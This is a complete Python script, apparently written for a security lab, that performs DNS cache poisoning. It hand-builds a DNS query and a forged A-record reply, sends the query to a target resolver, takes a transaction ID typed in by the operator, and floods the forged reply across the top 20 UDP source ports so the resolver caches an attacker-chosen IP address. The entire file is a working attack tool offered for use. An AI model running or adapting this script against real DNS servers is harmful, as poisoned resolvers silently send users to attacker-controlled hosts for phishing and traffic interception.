import argparse
import socket
from struct import pack
from time import sleep


def forgeDnsQuery(domain_name: str, transaction_id: int) -> bytes:
    questions = 1
    requestType = 1  # Type A (host address)
    requestClass = 1  # Class IN (Internet)

    labels = domain_name.split('.')
    encodedName = b''.join(pack('B', len(label)) + label.encode('utf-8') for label in labels) + b'\x00'

    # Header fields: ID, flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
    header = pack('!HHHHHH', transaction_id, 0x0100, questions, 0, 0, 0)
    # Question fields: QNAME, QTYPE, QCLASS
    question = encodedName + pack('!HH', requestType, requestClass)

    return header + question


def forgeDnsReply(name: str, address: str, transaction_id: int) -> bytes:
    # DNS Header
    questions = 1  # Number of questions
    answer_rrs = 1  # Number of answer resource records
    ns_rrs = 0  # Number of authority resource records
    ar_rrs = 0  # Number of additional resource records
    flags = 0x8180  # Response, No error (standard flags)

    labels = name.split('.')
    encodedName = b''.join(pack('B', len(label)) + label.encode('utf-8') for label in labels) + b'\x00'

    # Header
    header = pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, ns_rrs, ar_rrs)
    # Question Section
    question = encodedName + pack('!HH', 1, 1)  # QTYPE = 1 (A), QCLASS = 1 (IN)

    # Answer Section
    pointer = b'\xc0\x0c'  # Pointer to the domain name in the question section
    replyType = 1  # Type A (IPv4 address)
    replyClass = 1  # Class IN
    ttl = 300  # Time to live (e.g., 300 seconds)
    dataLength = 4  # Length of the IP address (4 bytes for IPv4)

    # Convert address to binary format
    addr = [int(part) for part in address.split('.')]
    resource_data = pack('!BBBB', *addr)

    answer = pointer + pack('!HHIH', replyType, replyClass, ttl, dataLength) + resource_data

    return header + question + answer


def parse_arguments():
    parser = argparse.ArgumentParser(description='DNS Poisoner')
    parser.add_argument('target_ip', help='IP address of the target DNS server')
    parser.add_argument('domain_name', help='Domain name to inject')
    parser.add_argument('ip_address', help='IP address to inject')
    args = parser.parse_args()

    # check if both domain name and IP address are valid
    try:
        socket.inet_aton(args.ip_address)
        socket.inet_aton(args.target_ip)
    except socket.error:
        print('Invalid IP address')
        exit(1)

    return args.target_ip, args.domain_name, args.ip_address


# Number of ports to try to send the malicious DNS reply (from 65'535 - NUMBER_OF_PORTS_TO_TRY to 65'535)
NUMBER_OF_PORTS_TO_TRY = 20
if __name__ == '__main__':
    targetedDnsServerIp, domainNameToInject, ipToInject = parse_arguments()

    # send a DNS query to the targeted DNS server, and brute force the transaction ID
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    dns_query = forgeDnsQuery(domainNameToInject, 1)
    sock.sendto(dns_query, (targetedDnsServerIp, 53))

    print("[INFO] DNS query sent to the targeted DNS server")
    sleep(0.1)
    transactionId = 0

    try:
        while True:
            print()
            print("Enter the transaction ID: ")
            transactionId = int(input(), 16)
            if transactionId < 0:
                print("[WARN] Invalid transaction ID. Try again")
                continue

            #  get the malicious DNS reply
            maliciousDnsReply = forgeDnsReply(domainNameToInject, ipToInject, transactionId)

            for targetedDnsPort in range(65535 - NUMBER_OF_PORTS_TO_TRY, 65535 + 1):
                sock.sendto(maliciousDnsReply, (targetedDnsServerIp, targetedDnsPort))
            print(f"[INFO] {NUMBER_OF_PORTS_TO_TRY} malicious DNS reply sent")
    except KeyboardInterrupt:
        print()
        print("[INFO] Exiting the program...")
        sock.close()
        exit(0)
